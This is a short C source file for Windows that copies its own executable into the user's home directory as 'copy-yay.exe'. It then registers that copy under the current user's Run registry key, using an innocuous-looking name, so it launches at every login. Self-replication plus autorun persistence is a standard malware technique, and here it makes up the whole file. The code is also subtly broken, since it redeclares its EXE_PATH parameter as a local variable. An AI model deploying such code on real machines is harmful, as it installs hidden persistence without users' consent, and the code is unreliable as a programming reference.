#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <winreg.h>

int add_to_startup_folder(const char *EXE_PATH, const char *PROGRAM_NAME) {
    HKEY hKey;
    const char *KEY_PATH = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char *EXE_PATH = EXE_PATH;

    if ( RegOpenKeyEx(HKEY_CURRENT_USER, KEY_PATH, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS ) {
        RegSetValueEx(*&hKey, PROGRAM_NAME, 0, REG_SZ, (BYTE *)EXE_PATH, strlen(EXE_PATH) + 1);
        RegCloseKey(*&hKey);
        printf("Successfully added program to startup registry.\n");
        return 0;
    } else { 
        printf("Failed to open registry key."); 
        return 1; 
    }
}

int main() {
    char source_path[MAX_PATH];
    char destination_path[MAX_PATH];

    GetModuleFileName(NULL, source_path, MAX_PATH); // Gets path to current executable.
    SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, destination_path); // Gets path to user directory.

    strcat(destination_path, "\\copy-yay.exe");

    if ( CopyFile(source_path, destination_path, FALSE) ) {
        printf("Program copied to home directory!");
    } else {
        printf("Program failed to copy.");
    }

    add_to_startup_folder(destination_path, "Local TimmarTillPermis");

    Sleep(2000);
    return 0;
}